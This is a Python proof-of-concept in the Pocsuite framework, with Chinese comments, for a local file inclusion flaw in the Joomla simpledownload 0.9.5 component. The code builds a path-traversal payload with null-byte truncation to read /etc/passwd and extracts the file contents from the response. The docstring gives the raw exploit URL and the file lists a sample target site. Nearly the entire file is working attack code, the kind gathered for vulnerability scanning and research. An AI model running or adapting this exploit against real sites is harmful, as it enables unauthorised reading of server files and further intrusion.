#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '68620'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2010-06-01'
    createDate = '2016-01-23'
    updateDate = '2016-01-23'
    references = ['http://www.seebug.org/vuldb/ssvid-68620']
    name = 'Joomla Component simpledownload 0.9.5 - LFI Vulnerability'
    appPowerLink = 'http://www.joomla.org'
    appName = 'Joomla Component simpledownload'
    appVersion = '0.9.5'
    vulType = 'LFI'
    desc = '''
        Joomla 组件simpledownload 0.9.5版本由于对参数controller过滤不严格，导致存在本地文件包含漏洞，
        在满足以下两个条件的前提下，可以结合%00截断，实现该漏洞的利用。
        (1)magic_quotes_gpc=off
        (2)PHP版本小于5.3.4

        该处漏洞读取/etc/passwd文件内容的POC格式如下：
        http://XXX.com/index.php?option=com_simpledownload
        &controller=../../../../../../../../../../../../../../../etc/passwd%00
    '''
    samples = ['http://tdctema.org']

    def _attack(self):
        return self._verify()

    def _verify(self):
        #利用LFI漏洞下载/etc/passwd文件
        result ={}
        #文件名称
        filename='/etc/passwd'
        #漏洞利用的地址
        payload='/index.php?option=com_simpledownload&controller='
        #..的个数
        dots='../'*14+'..'
        #截断符
        dBs='%00'
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #自定义的超时信息
        time=50
        #构造访问连接地址
        vulurl=self.url+payload+dots+filename+dBs
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=time)
        #判断返回页面内容
        if resp.status_code==200:
            #匹配内容
            match=re.search('nobody:.+?:[0-9]+:[0-9]+:.*:.*:.*', resp.content,re.S|re.M)
            if match:
                #提取文件内容成功
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vulurl
                result['FileInfo']={}
                result['FileInfo']['Filename']=filename
                result['FileInfo']['Content']=match.group(0)[:48]+'...'
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)